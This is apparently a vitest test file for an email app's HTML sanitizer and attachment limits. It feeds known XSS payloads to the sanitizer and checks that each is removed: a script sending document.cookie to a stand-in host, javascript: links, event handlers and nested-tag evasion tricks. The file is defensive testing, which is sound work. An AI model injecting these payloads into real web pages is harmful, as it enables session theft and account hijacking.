import { describe, expect, it } from 'vitest';
import { MAX_ATTACHMENT_BYTES, MAX_ATTACHMENTS, validateOutboundAttachments } from '@/lib/domain/email/attachment-limits';
import { sanitizeEmailHtml } from '@/lib/domain/email/html';

/**
 * Inbound HTML is a stranger's markup shown inside an application a business is signed into. These
 * are the ways it is classically turned against that, each held to "the dangerous part is gone and
 * the readable part is not".
 */
describe('sanitizing received HTML', () => {
  const clean = (html: string) => sanitizeEmailHtml(html);

  it('removes scripts with their content, not just their tags', () => {
    const out = clean('<p>Hello</p><script>fetch("https://evil.test/?c="+document.cookie)</script>');
    expect(out).toBe('<p>Hello</p>');
    expect(out).not.toMatch(/script|fetch|cookie/i);
  });

  it('removes every event handler, on any tag', () => {
    const out = clean('<p onclick="x()" onmouseover="y()">Hi</p><a href="https://ok.test" onfocus="z()">link</a><div onload="w()">d</div>');
    expect(out).not.toMatch(/\bon[a-z]+=/i);
    expect(out).toContain('Hi');
  });

  it.each(['javascript:alert(1)', 'JaVaScRiPt:alert(1)', ' javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)'])(
    'drops a dangerous link target: %s',
    (href) => {
      const out = clean(`<a href="${href}">click</a>`);
      expect(out).not.toMatch(/javascript|vbscript|data:/i);
      expect(out).toContain('click');
    },
  );

  it('keeps ordinary links but forces them out of the application: new context, no opener, no referrer', () => {
    const out = clean('<a href="https://example.test/page" target="_self" rel="author">go</a><a href="mailto:kim@example.test">mail</a>');
    expect(out).toContain('href="https://example.test/page"');
    expect(out).toContain('href="mailto:kim@example.test"');
    expect(out).toContain('target="_blank"');
    expect(out).toMatch(/rel="noopener noreferrer nofollow"/);
    expect(out).not.toContain('_self');
  });

  it('removes images altogether, because a remote image tells the sender when the mail was opened', () => {
    const out = clean('<p>See <img src="https://tracker.test/pixel.gif" onerror="x()"> this</p><img src="data:image/png;base64,AAAA">');
    expect(out).not.toMatch(/<img|tracker|data:/i);
    expect(out).toContain('See');
  });

  it('removes frames, objects, embeds, forms, styles and svg — everything that can host or run something', () => {
    const out = clean(
      '<iframe src="https://evil.test"></iframe><object data="x"></object><embed src="x"><form action="https://evil.test"><input name="p"><button>go</button></form>' +
        '<style>body{background:url(https://evil.test/x)}</style><svg onload="x()"><script>1</script></svg><link rel="stylesheet" href="https://evil.test/x.css"><meta http-equiv="refresh" content="0;url=https://evil.test">',
    );
    expect(out).not.toMatch(/<(iframe|object|embed|form|input|button|style|svg|link|meta)\b/i);
    expect(out).not.toMatch(/evil\.test/);
  });

  it('removes style and class attributes, which can restyle the page or hide content', () => {
    const out = clean('<p style="position:fixed;top:0;left:0;width:100%;height:100%" class="admin-only">overlay</p>');
    expect(out).toBe('<p>overlay</p>');
  });

  it('survives malformed and nested trickery without producing active content', () => {
    for (const hostile of [
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<a href="java\nscript:alert(1)">x</a>',
      '<p><<script>alert(1)//<</script>',
      '"><svg/onload=alert(1)>',
      '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    ]) {
      const out = clean(hostile);
      expect(out, hostile).not.toMatch(/<script|<svg|\bon[a-z]+\s*=|javascript:/i);
    }
  });

  it('keeps the readable structure of a normal message', () => {
    const out = clean('<h2>Quote</h2><p>Hello <strong>Kim</strong>,</p><ul><li>One</li></ul><blockquote>earlier</blockquote><table><tr><td colspan="2">x</td></tr></table>');
    for (const kept of ['<h2>Quote</h2>', '<strong>Kim</strong>', '<li>One</li>', '<blockquote>earlier</blockquote>', 'colspan="2"']) expect(out).toContain(kept);
  });
});

describe('what an email may carry', () => {
  const file = (name: string, size = 1000) => ({ name, size });

  it('accepts an ordinary set of files', () => {
    expect(validateOutboundAttachments([file('quote.pdf'), file('photo.jpg', 2_000_000)])).toBeNull();
    expect(validateOutboundAttachments([])).toBeNull();
  });

  it('refuses too many, an empty file, an oversized file and an oversized total', () => {
    expect(validateOutboundAttachments(Array.from({ length: MAX_ATTACHMENTS + 1 }, (_, i) => file(`f${i}.txt`)))).toMatch(/at most/);
    expect(validateOutboundAttachments([file('empty.txt', 0)])).toMatch(/empty/);
    expect(validateOutboundAttachments([file('big.bin', MAX_ATTACHMENT_BYTES + 1)])).toMatch(/larger than/);
    expect(validateOutboundAttachments([file('a.bin', 9_000_000), file('b.bin', 9_000_000), file('c.bin', 9_000_000)])).toMatch(/together/);
  });

  it.each(['setup.exe', 'run.BAT', 'x.scr', 'macro.js', 'script.ps1', 'app.jar'])('refuses an executable type: %s', (name) => {
    expect(validateOutboundAttachments([file(name)])).toMatch(/will not carry/);
  });
});
